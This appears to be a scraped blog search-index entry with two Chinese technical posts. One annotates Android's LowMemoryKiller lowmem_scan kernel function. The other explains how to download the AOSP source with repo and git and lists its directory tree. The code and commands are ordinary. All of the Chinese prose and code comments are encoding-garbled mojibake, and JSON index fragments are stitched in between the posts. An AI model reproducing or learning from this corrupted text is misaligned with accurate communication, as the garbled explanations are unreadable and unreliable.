ANONï¼šåŒ¿åé¡µï¼ŒåŒ¿åä»£è¡¨æ²¡æœ‰åå¤‡å­˜å‚¨ï¼Œè¿™ç§å†…å­˜å¦‚æœæƒ³å›æ”¶ï¼Œéœ€è¦æ¢å‡ºåˆ°ç¡¬ç›˜ä¸Šçš„ swap åˆ†åŒºï¼› FILEï¼šæ–‡ä»¶é¡µï¼Œæ–‡ä»¶ä»£è¡¨æœ‰æ–‡ä»¶å¯¹åº”ï¼Œè¿™ç§å†…å­˜å¦‚æœæƒ³å›æ”¶ï¼Œåªéœ€å°†æœ‰æ•°æ®æ›´æ–°çš„è„é¡µï¼ˆdirty pageï¼‰å†™å›åˆ°ç£ç›˜çš„æ–‡ä»¶ä¸­å³å¯ã€‚ å†…å­˜çš„è®¡ç®— = æ´»è·ƒåŒ¿åé¡µ + æ´»è·ƒæ–‡ä»¶é¡µ + éæ´»è·ƒåŒ¿åé¡µ + éæ´»è·ƒæ–‡ä»¶é¡µã€‚ # lowmem_scan é‡Šæ”¾ç¼“å­˜ //msm-google\\drivers\\staging\\android\\lowmemorykiller.cstatic unsigned long lowmem_scan(struct shrinker *s, struct shrink_control *sc)&#123; struct task_struct *tsk; struct task_struct *selected = NULL; unsigned long rem = 0; int tasksize; int i; short min_score_adj = OOM_SCORE_ADJ_MAX + 1; int minfree = 0; int selected_tasksize = 0; short selected_oom_score_adj; int array_size = ARRAY_SIZE(lowmem_adj); // å½“å‰ç³»ç»Ÿå‰©ä½™å†…å­˜å¤§å°ï¼Œç®—æ³•ä¸ºï¼šåŸºäº free æ€»é‡å»é™¤å…¶ä¸­ä½œä¸º reserve ç®¡ç†ç»“æ„çš„éƒ¨åˆ† int other_free = global_page_state(NR_FREE_PAGES) - totalreserve_pages; // å½“å‰ç³»ç»Ÿ page cache çš„å¤§å° int other_file = global_node_page_state(NR_FILE_PAGES) - global_node_page_state(NR_SHMEM) - global_node_page_state(NR_UNEVICTABLE) - total_swapcache_pages(); if (lowmem_adj_size &lt; array_size) array_size = lowmem_adj_size; if (lowmem_minfree_size &lt; array_size) array_size = lowmem_minfree_size; // éå†æœ€å°å†…å­˜é˜ˆå€¼ï¼Œå¦‚æœå½“å‰å†…å­˜ä½äºé˜ˆå€¼ï¼ŒåŒæ—¶å½“å‰ page cache ä¹Ÿä½äºé˜ˆå€¼ï¼Œ //(å†…å­˜å……è£•æ—¶ä¼šæœ‰å¤§é‡å†…å­˜å……å½“ page cache ä»¥æé«˜ç³»ç»Ÿ IO æ€§èƒ½) // åˆ™ä¸º min_score_adj èµ‹å€¼åé€€å‡º for å¾ªç¯ for (i = 0; i &lt; array_size; i++) &#123; minfree = lowmem_minfree[i]; if (other_free &lt; minfree &amp;&amp; other_file &lt; minfree) &#123; min_score_adj = lowmem_adj[i]; break; &#125; &#125; lowmem_print(3, \"lowmem_scan %lu, %x, ofree %d %d, ma %hd\\n\", sc->nr_to_scan, sc->gfp_mask, other_free, other_file, min_score_adj); // å¦‚æœ min_score_adj ç­‰äºåˆå€¼ï¼Œåˆ™è¡¨ç¤ºå†…å­˜å……è¶³ï¼Œé€€å‡ºå‡½æ•° if (min_score_adj == OOM_SCORE_ADJ_MAX + 1) &#123; lowmem_print(5, \"lowmem_scan %lu, %x, return 0\\n\", sc->nr_to_scan, sc->gfp_mask); return 0; &#125; selected_oom_score_adj = min_score_adj; // å†…æ ¸ RCU (Read-Copy Update) åŒæ­¥æœºåˆ¶ // éšæ„è¯»ï¼Œä½†æ›´æ–°æ•°æ®çš„æ—¶å€™ï¼Œéœ€è¦å…ˆå¤åˆ¶ä¸€ä»½å‰¯æœ¬ï¼Œåœ¨å‰¯æœ¬ä¸Šå®Œæˆä¿®æ”¹ï¼Œå†ä¸€æ¬¡æ€§åœ°æ›¿æ¢æ—§æ•°æ® rcu_read_lock(); // éå†ç³»ç»Ÿè¿›ç¨‹ï¼Œè¦å¼€å§‹æ€è¿›ç¨‹äº† for_each_process(tsk) &#123; struct task_struct *p; short oom_score_adj; // å†…æ ¸è¿›ç¨‹ï¼Œè·³è¿‡ if (tsk->flags &amp; PF_KTHREAD) continue; // å¯¹äºæ™®é€šç”¨æˆ·è¿›ç¨‹æ¥è¯´ï¼Œmm æŒ‡å‘è™šæ‹Ÿåœ°å€ç©ºé—´çš„ç”¨æˆ·ç©ºé—´éƒ¨åˆ†ï¼Œè€Œå¯¹äºå†…æ ¸çº¿ç¨‹ï¼Œmm ä¸º NULLã€‚ // å†…æ ¸çº¿ç¨‹å’Œæ™®é€šçš„è¿›ç¨‹é—´çš„åŒºåˆ«åœ¨äºå†…æ ¸çº¿ç¨‹æ²¡æœ‰ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œmm æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULLï¼› // å®ƒåªåœ¨å†…æ ¸ç©ºé—´è¿è¡Œï¼Œä»æ¥ä¸åˆ‡æ¢åˆ°ç”¨æˆ·ç©ºé—´å»ï¼›å¹¶ä¸”å’Œæ™®é€šè¿›ç¨‹ä¸€æ ·ï¼Œå¯ä»¥è¢«è°ƒåº¦ï¼Œä¹Ÿå¯ä»¥è¢«æŠ¢å ã€‚ // å¦‚æœæ˜¯å†…æ ¸çº¿ç¨‹ï¼Œç›´æ¥è·³è¿‡ p = find_lock_task_mm(tsk); if (!p) continue; if (task_lmk_waiting(p) &amp;&amp; time_before_eq(jiffies, lowmem_deathpending_timeout)) &#123; task_unlock(p); rcu_read_unlock(); return 0; &#125; // å¦‚æœå½“å‰æ‰¾åˆ°çš„è¿›ç¨‹çš„ oom_score_adj æ¯”å½“å‰éœ€è¦æ€çš„æœ€å°ä¼˜å…ˆçº§è¿˜ä½ï¼Œä¸æ€ oom_score_adj = p->signal->oom_score_adj; if (oom_score_adj &lt; min_score_adj) &#123; task_unlock(p); continue; &#125; // è·å–è¿›ç¨‹çš„å ç”¨å†…å­˜å¤§å° (rss å€¼) //rss: resident set size, the non-swappend physical memory that a task has used in. tasksize = get_mm_rss(p->mm); task_unlock(p); if (tasksize &lt;= 0) continue; // é¦–ä¸ªè¿›ç¨‹ï¼Œselected å€¼å¿…ä¸º NULL if (selected) &#123; // é«˜ä¼˜å…ˆçº§è¿›ç¨‹ï¼Œä¸æ€ if (oom_score_adj &lt; selected_oom_score_adj) continue; // åŒä¼˜å…ˆçº§è¿›ç¨‹ï¼Œå¦‚æœè¯¥è¿›ç¨‹å ç”¨å†…å­˜å°äºé˜ˆå€¼ï¼ŒåŒæ ·ä¸æ€ if (oom_score_adj == selected_oom_score_adj &amp;&amp; tasksize &lt;= selected_tasksize) continue; &#125; // å·²ç»æ‰¾åˆ°äº†éœ€è¦ kill çš„è¿›ç¨‹ï¼Œæ›´æ–°å®ƒçš„ tasksize ä¸ oom_score_adj selected = p; selected_tasksize = tasksize; selected_oom_score_adj = oom_score_adj; lowmem_print(2, \"select '%s' (%d), adj %hd, size %d, to kill\\n\", p->comm, p->pid, oom_score_adj, tasksize); &#125; if (selected) &#123; long cache_size = other_file * (long)(PAGE_SIZE / 1024); long cache_limit = minfree * (long)(PAGE_SIZE / 1024); long free = other_free * (long)(PAGE_SIZE / 1024); task_lock(selected); // å‘é€ SIGKILL ä¿¡å·ï¼Œæ€æ­»è¿™ä¸ªè¿›ç¨‹ send_sig(SIGKILL, selected, 0); if (selected->mm) task_set_lmk_waiting(selected); task_unlock(selected); trace_lowmemory_kill(selected, cache_size, cache_limit, free); lowmem_print(1, \"Killing '%s' (%d) (tgid %d), adj %hd,\\n\" \" to free %ldkB on behalf of '%s' (%d) because\\n\" \" cache %ldkB is below limit %ldkB for oom_score_adj %hd\\n\" \" Free memory is %ldkB above reserved\\n\", selected->comm, selected->pid, selected->tgid, selected_oom_score_adj, selected_tasksize * (long)(PAGE_SIZE / 1024), current->comm, current->pid, cache_size, cache_limit, min_score_adj, free); lowmem_deathpending_timeout = jiffies + HZ; rem += selected_tasksize; get_task_struct(selected); &#125; lowmem_print(4, \"lowmem_scan %lu, %x, return %lu\\n\", sc->nr_to_scan, sc->gfp_mask, rem); rcu_read_unlock(); if (selected) &#123; handle_lmk_event(selected, selected_tasksize, min_score_adj); put_task_struct(selected); &#125; return rem;&#125;# å‚è€ƒèµ„æ–™ Android LowMemoryKiller åŸç†åˆ†æ Android è¿›ç¨‹ç³»åˆ—ç¬¬å…­ç¯‡ â€”LowmemoryKiller æœºåˆ¶åˆ†æ (ä¸Š) Android è¿›ç¨‹ç³»åˆ—ç¬¬ä¸ƒç¯‡ â€”LowmemoryKiller æœºåˆ¶åˆ†æ (ä¸­) Android è¿›ç¨‹ç³»åˆ—ç¬¬å…«ç¯‡ â€”LowmemoryKiller æœºåˆ¶åˆ†æ (ä¸‹) linux å†…æ ¸ï¼šä¸€æ–‡è¯»æ‡‚ lowmemorykiller æœºåˆ¶","categories":[],"tags":[]},{"title":"å®‰å“ç³»ç»Ÿæºç ç»“æ„","slug":"android-source-code","date":"2023-10-10T01:47:20.000Z","updated":"2024-06-20T13:57:49.000Z","comments":true,"path":"android-source-code/","link":"","permalink":"https://oacia.dev/android-source-code/","excerpt":"","text":"# å®‰å“ç³»ç»Ÿæºç ä¸‹è½½ æƒ³è¦ä¸‹è½½å¹¶ç¼–è¯‘å®‰å“ç³»ç»Ÿå…¨éƒ¨çš„æºç ï¼Œè¯·å¿…é¡»é¢„ç•™ 250G åŠä»¥ä¸Šçš„ä»£ç†ç©ºé—´ï¼Œå¦‚æœä»…ä¸‹è½½çš„è¯ï¼Œ150 åˆ° 200G çš„ç©ºé—´å°±è¶³å¤Ÿ l ä¸‹è½½è¿‡ç¨‹ä¸­éœ€è¦ä¿æŒ VPN è¿æ¥ç¨³å®šï¼Œå¦åˆ™å°†å¯¼è‡´ä¸‹è½½å¤±è´¥å¹¶ä»å¤´ä¸‹è½½ï¼ # æŸ¥çœ‹ android ç‰ˆæœ¬ è¿›å…¥ä»£å·ï¼Œæ ‡è®°å’Œ build å·æ¥æŸ¥çœ‹å®‰å“ç³»ç»Ÿçš„ç‰ˆæœ¬ å¦‚æœæ˜¯é¢„è£…çš„ç³»ç»Ÿï¼Œé‚£ä¹ˆ kernel ç‰ˆæœ¬å’Œç³»ç»Ÿç‰ˆæœ¬æ˜¯æœ‰å¯¹åº”å…³ç³»çš„ï¼Œä¾‹å¦‚æˆ‘ç»™ pixel3 åˆ·å…¥çš„ç³»ç»Ÿä¸º blueline-sp1a.210812.016.c2-factory-fa981d87 , é‚£ä¹ˆåœ¨ä¸Šé¢æåˆ°çš„ç½‘å€å†…æ‰¾åˆ°è¯¥å®‰å“ç³»ç»Ÿè¯¥ build ID æ‰€å¯¹åº”çš„å®‰å“ç³»ç»Ÿç‰ˆæœ¬ android-12.0.0_r34 å¦‚å›¾æ‰€ç¤º # ä¸‹è½½ å…³äºç¯å¢ƒçš„é…ç½®è¯·å‚é˜…è¿™ç¯‡æ–‡ç«  è¾“å…¥å¦‚ä¸‹å‘½ä»¤æ¥è¿›è¡Œå®‰å“ç³»ç»Ÿæºç ä¸‹è½½ï¼Œåˆ†æ”¯å°±é€‰æ‹©æˆ‘ä»¬ä¹‹å‰æŸ¥æ‰¾åˆ°çš„é‚£ä¸ªåˆ†æ”¯ mkdir android-platform &amp;&amp; cd android-platformrepo init -u https://android.googlesource.com/platform/manifest -b android-12.0.0_r34 --depth=1repo sync -j4# å®‰å“ç³»ç»Ÿæºç æŒ‰éœ€ä¸‹è½½ æœ‰çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¹¶ä¸éœ€è¦é«˜è¾¾ä¸€ç™¾å¤š G çš„æºç ï¼Œè€Œä»…ä»…æƒ³è¦çœ‹æˆ‘ä»¬æ„Ÿå…´è¶£çš„éƒ¨åˆ†çš„æºç ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥è¿›è¡ŒæŒ‰éœ€ä¸‹è½½ æ¥åˆ° Google git android platform, ä¾‹å¦‚æˆ‘ä»¬æƒ³è¦çœ‹ frameworks/base è¿™éƒ¨åˆ†çš„æºç ï¼Œé‚£æˆ‘ä»¬å°±å…¨å±€æœç´¢å¹¶å°†è¿›å…¥è¿™é‡Œ åœ¨è¿™é‡Œä¸Šé¢æœ‰æç¤ºæˆ‘ä»¬å¯ä»¥ç”¨ git clone å‘½ä»¤æ¥è¿›è¡Œä¸‹è½½ å½“ç„¶ç›´æ¥è¾“å…¥å‘½ä»¤æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥å»ç­›é€‰æˆ‘ä»¬æƒ³è¦çš„åˆ†æ”¯æ¥è¿›è¡Œä¸‹è½½ git clone https://android.googlesource.com/platform/frameworks/base -b android-12.0.0_r34 --depth=1# å®‰å“ç³»ç»Ÿæºç ç›®å½•ç»“æ„ # æ ¹ç›®å½•æ€»è§ˆ |-- Makefile||-- artï¼ˆAndroid Runtimeï¼Œä¸€ç§Appè¿è¡Œæ¨¡å¼ï¼ŒåŒºåˆ«äºä¼ ç»Ÿçš„Dalvikè™šæ‹Ÿæœºï¼Œæ—¨åœ¨æé«˜Androidç³»ç»Ÿçš„æµç•…æ€§ï¼‰||-- bionic ï¼ˆbionic Cåº“ï¼‰||-- bootable ï¼ˆå¯åŠ¨å¼•å¯¼ç›¸å…³ä»£ç ï¼‰||-- build ï¼ˆå­˜æ”¾ç³»ç»Ÿç¼–è¯‘è§„åˆ™åŠgenericç­‰åŸºç¡€å¼€å‘åŒ…é…ç½®ï¼‰||-- cts ï¼ˆAndroidå…¼å®¹æ€§æµ‹è¯•å¥—ä»¶æ ‡å‡†ï¼‰||-- dalvik ï¼ˆdalvik JAVAè™šæ‹Ÿæœºï¼‰||-- development ï¼ˆåº”ç”¨ç¨‹åºå¼€å‘ç›¸å…³ï¼‰||-- external ï¼ˆandroidä½¿ç”¨çš„ä¸€äº›å¼€æºçš„æ¨¡ç»„ï¼‰||-- frameworks ï¼ˆæ ¸å¿ƒæ¡†æ¶â€”â€”javaåŠC++è¯­è¨€ï¼‰||-- hardware ï¼ˆéƒ¨åˆ†å‚å®¶å¼€æºçš„ç¡¬è§£é€‚é…å±‚HALä»£ç ï¼‰||-- out ï¼ˆç¼–è¯‘å®Œæˆåçš„ä»£ç è¾“å‡ºä¸æ­¤ç›®å½•ï¼‰||-- packages ï¼ˆåº”ç”¨ç¨‹åºåŒ…ï¼‰||-- prebuilt ï¼ˆx86å’Œarmæ¶æ„ä¸‹é¢„ç¼–è¯‘çš„ä¸€äº›èµ„æºï¼‰||-- sdk ï¼ˆsdkåŠæ¨¡æ‹Ÿå™¨ï¼‰||-- system ï¼ˆåº•å±‚æ–‡ä»¶ç³»ç»Ÿåº“ã€åº”ç”¨åŠç»„ä»¶â€”â€”Cè¯­è¨€ï¼‰||-- vendor ï¼ˆå‚å•†å®šåˆ¶ä»£ç ï¼‰# system app ç›¸å…³ç›®å½•ä¸º packages/apps |-- apps ï¼ˆåº”ç”¨ç¨‹åºåº“ï¼‰| |-- AlarmClock ï¼ˆé—¹é’Ÿï¼‰| |-- Bluetooth ï¼ˆè“ç‰™ï¼‰| |-- Browser ï¼ˆæµè§ˆå™¨ï¼‰| |-- Calculator ï¼ˆè®¡ç®—å™¨ï¼‰| |-- Calendar ï¼ˆæ—¥å†ï¼‰| |-- Camera ï¼ˆç›¸æœºï¼‰| |-- CertInstaller ï¼ˆåœ¨Androidä¸­å®‰è£…æ•°å­—ç­¾åï¼Œè¢«è°ƒç”¨ï¼‰| |-- Contacts ï¼ˆæ‹¨å·(è°ƒç”¨)ã€è”ç³»äººã€é€šè¯è®°å½•ï¼‰| |-- DeskClock ï¼ˆæ¡Œé¢æ—¶é’Ÿï¼‰| |-- Email ï¼ˆEmailï¼‰| |-- Gallery ï¼ˆç›¸å†Œï¼Œå’ŒCameraç±»ä¼¼ï¼Œå¤šäº†åˆ—è¡¨ï¼‰| |-- Gallery3D ï¼ˆï¼Ÿ3Dç›¸å†Œï¼‰| |-- GlobalSearch ï¼ˆä¸ºgoogleæœç´¢æœåŠ¡ï¼Œæä¾›åº•å±‚åº”ç”¨ï¼‰| |-- GoogleSearch ï¼ˆgoogleæœç´¢ï¼‰| |-- HTMLViewer ï¼ˆæµè§ˆå™¨é™„å±ç•Œé¢ï¼Œè¢«æµè§ˆå™¨åº”ç”¨è°ƒç”¨ï¼ŒåŒæ—¶æä¾›å­˜å‚¨è®°å½•åŠŸèƒ½ï¼‰| |-- IM ï¼ˆå³æ—¶é€šè®¯ï¼Œä¸ºæ‰‹æœºæä¾›ä¿¡å·å‘é€ã€æ¥æ”¶ã€é€šä¿¡çš„æœåŠ¡ï¼‰| |-- Launcher ï¼ˆç™»é™†å¯åŠ¨é¡¹ï¼Œæ˜¾ç¤ºå›¾ç‰‡æ¡†æ¶ç­‰ç­‰å›¾å½¢ç•Œé¢ï¼‰| |-- Launcher2 ï¼ˆç™»é™†å¯åŠ¨é¡¹ï¼Œè´Ÿè´£åº”ç”¨çš„è°ƒç”¨ï¼‰| |-- Mms ï¼ˆï¼Ÿå½©ä¿¡ä¸šåŠ¡ï¼‰| |-- Music ï¼ˆéŸ³ä¹æ’­æ”¾å™¨ï¼‰| |-- PackageInstaller ï¼ˆå®‰è£…ã€å¸è½½ç¨‹åºçš„å“åº”ï¼‰| |-- Phone ï¼ˆç”µè¯æ‹¨å·ç¨‹åºï¼‰| |-- Provision ï¼ˆé¢„è®¾åº”ç”¨çš„çŠ¶æ€ï¼Œä½¿èƒ½åº”ç”¨ï¼‰| |-- Settings ï¼ˆå¼€æœºè®¾å®šï¼ŒåŒ…æ‹¬ç”µé‡ã€è“ç‰™ã€è®¾å¤‡ä¿¡æ¯ã€ç•Œé¢ã€wifiç­‰ï¼‰| |-- SoundRecorder ï¼ˆå½•éŸ³æœºï¼Œå¯è®¡ç®—å­˜å‚¨æ‰€éœ€ç©ºé—´å’Œæ—¶é—´ï¼‰| |-- Stk ï¼ˆæ¥æ”¶å’Œå‘é€çŸ­ä¿¡ï¼‰| |-- Sync ï¼ˆç©ºï¼‰ -------â—‹1| |-- Updater ï¼ˆç©ºï¼‰| `-- VoiceDialer ï¼ˆè¯­éŸ³è¯†åˆ«é€šè¯ï¼‰|-- inputmethods ï¼ˆè¾“å…¥æ³•ï¼‰| |-- LatinIME ï¼ˆæ‹‰ä¸æ–‡è¾“å…¥æ³•ï¼‰| |-- OpenWnn ï¼ˆOpenWnnè¾“å…¥æ³•ï¼‰| `-- PinyinIME ï¼ˆæ‹¼éŸ³è¾“å…¥æ³•ï¼‰|-- providers ï¼ˆæä¾›å™¨ï¼Œæä¾›åº”ç”¨ç¨‹åºã€ç•Œé¢æ‰€éœ€çš„æ•°æ®ï¼‰| |-- ApplicationsProvider ï¼ˆåº”ç”¨ç¨‹åºæä¾›å™¨ï¼Œæä¾›åº”ç”¨ç¨‹åºå¯åŠ¨é¡¹ã€æ›´æ–°ç­‰ï¼‰| |-- CalendarProvider ï¼ˆæ—¥å†æä¾›å™¨ï¼‰| |-- ContactsProvider ï¼ˆè”ç³»äººæä¾›å™¨ï¼‰| |-- DownloadProvider ï¼ˆä¸‹è½½ç®¡ç†æä¾›å™¨ï¼‰| |-- DrmProvider ï¼ˆåˆ›å»ºå’Œæ›´æ–°æ•°æ®åº“æ—¶è°ƒç”¨ï¼‰| |-- GoogleContactsProvider ï¼ˆè”ç³»äººæä¾›å™¨çš„å­ç±»ï¼Œç”¨ä»¥åŒæ­¥è”ç³»äººï¼‰| |-- GoogleSubscribedFeedsProviderï¼ˆè®¾ç½®ä¿¡æ¯æä¾›å™¨ï¼‰| |-- ImProvider ï¼ˆç©ºï¼‰| |-- ManagementProvider ï¼ˆç©ºï¼‰| |-- MediaProvider ï¼ˆåª’ä½“æä¾›å™¨ï¼Œæä¾›å­˜å‚¨æ•°æ®ï¼‰| |-- TelephonyProvider ï¼ˆå½©ä¿¡æä¾›å™¨ï¼‰| |-- UserDictionaryProvider ï¼ˆç”¨æˆ·å­—å…¸æä¾›å™¨ï¼Œæä¾›ç”¨æˆ·å¸¸ç”¨å­—å­—å…¸ï¼‰| `-- WebSearchProvider ï¼ˆç©ºï¼‰|-- services | |-- EasService ï¼ˆç©ºï¼‰| `-- LockAndWipe ï¼ˆç©ºï¼‰`-- wallpapers ï¼ˆå¢™çº¸ï¼‰ |-- Basic ï¼ˆåŸºæœ¬å¢™çº¸ï¼Œç³»ç»Ÿå†…ç½®å¢™çº¸ï¼‰ |-- LivePicker ï¼ˆé€‰æ‹©åŠ¨æ€å£çº¸ï¼‰ |-- MagicSmoke ï¼ˆå£çº¸ç‰¹æ®Šæ•ˆæœï¼‰ `-- MusicVisualization ï¼ˆéŸ³ä¹å¯è§†åŒ–ï¼Œå›¾å½¢éšéŸ³ä¹è€Œå˜åŒ–ï¼‰# Java API Framework å¯¹åº”çš„ç›®å½•ä¸º frameworks/ |--av(å¤šåª’ä½“)| |--camera(å¤šåª’ä½“çš„ç›¸å…³éƒ¨åˆ†)| |--cmds(å‘½ä»¤æºç )| |--drm(æ•°æ®ä¿æŠ¤)| |--include(å¤´æ–‡ä»¶)| |--media(å¤šåª’ä½“éƒ¨åˆ†)| |--radio(æ— çº¿å°„é¢‘éƒ¨åˆ†)| |--services(æœåŠ¡éƒ¨åˆ†)| |--soundtrigger(è¯­éŸ³è¯†åˆ«æ¶æ„)| |--tools(å·¥å…·åŒ…)|-- base | |-- apct-tests(æ€§èƒ½ä¼˜åŒ–æµ‹è¯•)| |-- apiï¼ˆjavaçš„apiæ¥å£ï¼Œä¿®æ”¹äº†æ¥å£æ–‡ä»¶è¯·åŠæ—¶æ›´æ–°æ­¤ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼ˆmake update-apiï¼‰ï¼‰| |-- cmds(é‡è¦çš„å‘½ä»¤ï¼šamã€app_procç­‰æºç )| |-- core(frameworkå±‚æ ¸å¿ƒåº“)| | |--java(javaåº“)| | |--jni(jniå±‚)| | |--prote(åè®®å±‚)| | |--res(èµ„æºæ–‡ä»¶)| | |--tests(æµ‹è¯•å·¥å…·)| |-- dataï¼ˆå­—ä½“å’Œå£°éŸ³ç­‰æ•°æ®æ–‡ä»¶ï¼‰| |-- docsï¼ˆæ–‡æ¡£ï¼‰| |-- drm(æ•°æ®ä¿æŠ¤)| |-- graphics(å›¾å½¢ç›¸å…³)| |-- keystore(å’Œæ•°æ®ç­¾åè¯ä¹¦ç›¸å…³)| |-- legacy-test(å®‰å…¨ç›¸å…³æµ‹è¯•)| |-- libsï¼ˆåº“ï¼‰| | |--androidfw(fwåŠŸèƒ½åº“)| | |--common_time(å¸¸ç”¨åŠŸèƒ½å’Œå·¥å…·é›†åˆï¼Œç¼“å­˜ï¼ŒåŒ…æ‹¬å›¾ç‰‡ç¼“å­˜ã€é¢„å–ç¼“å­˜ã€ç½‘ç»œç¼“å­˜ã€å…¬å…±Viewï¼Œå³åŠŸèƒ½å°è£…å¥½çš„éƒ¨ä»¶ï¼ŒåŒ…æ‹¬ä¸‹æ‹‰è·å¾—å’Œä¸Šæ‹‰åŠ è½½æ›´å¤šListViewã€åº•éƒ¨åŠ è½½æ›´å¤šScrollViewã€æ»‘åŠ¨ä¸€é¡µGalleryç­‰ï¼›å¸¸ç”¨å·¥å…·ç±»ï¼ŒåŒ…æ‹¬ç½‘ç»œã€ä¸‹è½½ã€èµ„æºæ“ä½œã€Shellã€æ–‡ä»¶è¯»å†™ã€Jsonã€åºåˆ—åŒ–/ååºåˆ—åŒ–ã€éšæœºæ•°ã€é›†åˆã€APKåŒ…ç­‰ç­‰)| | |--hwui (ç¡¬ä»¶æ¸²æŸ“åº“)| | |--incident(äº‹ä»¶é©±åŠ¨æœºåˆ¶åº“)| | |--input(è¾“å…¥åº“)| | |--services(æœåŠ¡åº“)| | |--å­˜å‚¨åº“| | |--usb(usbåº“)| |-- locationï¼ˆåœ°åŒºåº“ï¼‰| |-- mediaï¼ˆåª’ä½“ç›¸å…³åº“ï¼‰| |-- native(nativeæ¡†æ¶)| |-- nfc-extras(nfcé¢å¤–æ¡†æ¶)| |-- obex ï¼ˆè“ç‰™ä¼ è¾“åº“ï¼‰| |-- opengl ï¼ˆ2D-3DåŠ é€Ÿåº“ï¼‰| |-- packages ï¼ˆè®¾ç½®ã€TTSã€VPNç¨‹åºï¼‰| |-- proto (åè®®æ¡†æ¶)| |-- rs (èµ„æºæ¡†æ¶)| |-- sample (ä¾‹å­ç¨‹åº)| |-- sax (xmlè§£æå™¨)| |-- services (å„ç§æœåŠ¡ç¨‹åº)| |-- telecomm (Telecomé€šä¿¡æ¡†æ¶)| |-- telephony (ç”µè¯é€šä¿¡æ¡†æ¶)| |-- test-runner (æµ‹è¯•å·¥å…·ç›¸å…³)| |-- tests ï¼ˆå„ç§æµ‹è¯•ï¼‰| |-- tools ï¼ˆä¸€äº›å«ä¸ä¸Šåçš„å·¥å…·ï¼‰| |-- vr (è™šæ‹Ÿç°å®ç›¸å…³)| `-- wifi ï¼ˆæ— çº¿ç½‘ç»œï¼‰||--compile (ç¼–è¯‘ç›¸å…³)| |-- libbcc (ç”¨äºLinuxæ€§èƒ½ç›‘è§†çš„åŠ¨æ€è·Ÿè¸ªå·¥å…·çš„åº“)| | |-- bcinfo(è·å–ç¡¬ä»¶è®¾å¤‡ä¿¡æ¯)| | |-- gdb_plugin(gdbæ’ä»¶)| | |-- includeï¼ˆå¤´æ–‡ä»¶ï¼‰| | |-- libï¼ˆåº“æ–‡ä»¶ï¼‰| |-- mclinker (MCLinkeré“¾æ¥å™¨)| | |-- include(å¤´æ–‡ä»¶)| | |-- lib(åº“æ–‡ä»¶)| | |-- templates(æ¨¡æ¿)| | |-- tools(å·¥å…·)| | |-- unittests(å•å…ƒæµ‹è¯•å·¥å…·)| |-- slangï¼ˆå¼‚å¸¸æ¡†æ¶ï¼‰||--data-binding||--exï¼ˆexæ–‡ä»¶è§£æå™¨ï¼‰| |-- camera2 ï¼ˆç›¸æœºç›¸å…³ï¼‰| |-- common //å…±æœ‰çš„| |-- framesequenceï¼ˆGIFå›¾ç‰‡å·¥å…·åŒ…ï¼‰| |-- photoviewer(å›¾ç‰‡é¢„è§ˆ)| |-- widget(å°éƒ¨ä»¶)|--hardware||--layoutlib||--minikin(AndroidåŸç”Ÿå­—ä½“ï¼Œè¿ä½“å­—æ•ˆæœ)||--ml||--multidex||--native|||-- opt ï¼ˆå¯é€‰éƒ¨åˆ†ï¼‰| |-- com.google.android ï¼ˆæœ‰ä¸ªframework.jarï¼‰| |-- com.google.android.googlelogin ï¼ˆæœ‰ä¸ªclient.jarï¼‰| `-- emoji ï¼ˆstandard message elementsï¼‰||--rs||--support||--webview||--wihelm# Native C/C++ Libraries and Android runtime # Native C/C++ Libraries libc å¯¹åº”æ ¹ç›®å½•ä¸‹çš„ bionic/ |-- libc ï¼ˆCåº“ï¼‰| |-- arch-arm ï¼ˆARMæ¶æ„ï¼ŒåŒ…å«ç³»ç»Ÿè°ƒç”¨æ±‡ç¼–å®ç°ï¼‰| |-- arch-x86 ï¼ˆx86æ¶æ„ï¼ŒåŒ…å«ç³»ç»Ÿè°ƒç”¨æ±‡ç¼–å®ç°ï¼‰| |-- bionic ï¼ˆç”±Cå®ç°çš„åŠŸèƒ½ï¼Œæ¶æ„æ— å…³ï¼‰| |-- docs ï¼ˆæ–‡æ¡£ï¼‰| |-- include ï¼ˆå¤´æ–‡ä»¶ï¼‰| |-- inet ï¼ˆï¼Ÿinetç›¸å…³ï¼Œå…·ä½“ä½œç”¨ä¸æ˜ï¼‰| |-- kernel ï¼ˆLinuxå†…æ ¸ä¸­çš„ä¸€äº›å¤´æ–‡ä»¶ï¼‰| |-- netbsd ï¼ˆï¼Ÿnesbsdç³»ç»Ÿç›¸å…³ï¼Œå…·ä½“ä½œç”¨ä¸æ˜ï¼‰| |-- private ï¼ˆï¼Ÿä¸€äº›ç§æœ‰çš„å¤´æ–‡ä»¶ï¼‰| |-- stdio ï¼ˆstdioå®ç°ï¼‰| |-- stdlib ï¼ˆstdlibå®ç°ï¼‰| |-- string ï¼ˆstringå‡½æ•°å®ç°ï¼‰| |-- tools ï¼ˆå‡ ä¸ªå·¥å…·ï¼‰| |-- tzcode ï¼ˆæ—¶åŒºç›¸å…³ä»£ç ï¼‰| |-- unistd ï¼ˆunistdå®ç°ï¼‰| `-- zoneinfo ï¼ˆæ—¶åŒºä¿¡æ¯ï¼‰|-- libdl ï¼ˆlibdlå®ç°ï¼Œdlæ˜¯åŠ¨æ€é“¾æ¥ï¼Œæä¾›è®¿é—®åŠ¨æ€é“¾æ¥åº“çš„åŠŸèƒ½ï¼‰|-- libm ï¼ˆlibmæ•°å­¦åº“çš„å®ç°ï¼Œï¼‰| |-- alpha ï¼ˆapahaæ¶æ„ï¼‰| |-- amd64 ï¼ˆamd64æ¶æ„ï¼‰| |-- arm ï¼ˆarmæ¶æ„ï¼‰| |-- bsdsrc ï¼ˆï¼Ÿbsdçš„æºç ï¼‰| |-- i386 ï¼ˆi386æ¶æ„ï¼‰| |-- i387 ï¼ˆi387æ¶æ„ï¼Ÿï¼‰| |-- ia64 ï¼ˆia64æ¶æ„ï¼‰| |-- include ï¼ˆå¤´æ–‡ä»¶ï¼‰| |-- man ï¼ˆæ•°å­¦å‡½æ•°ï¼Œåç¼€åä¸º.3ï¼Œä¸€äº›ä¸ºfreeBSDçš„åº“æ–‡ä»¶ï¼‰| |-- powerpc ï¼ˆpowerpcæ¶æ„ï¼‰| |-- sparc64 ï¼ˆsparc64æ¶æ„ï¼‰| `-- src ï¼ˆæºä»£ç ï¼‰|-- libstdc++ ï¼ˆlibstdc++ C++å®ç°åº“ï¼‰| |-- include 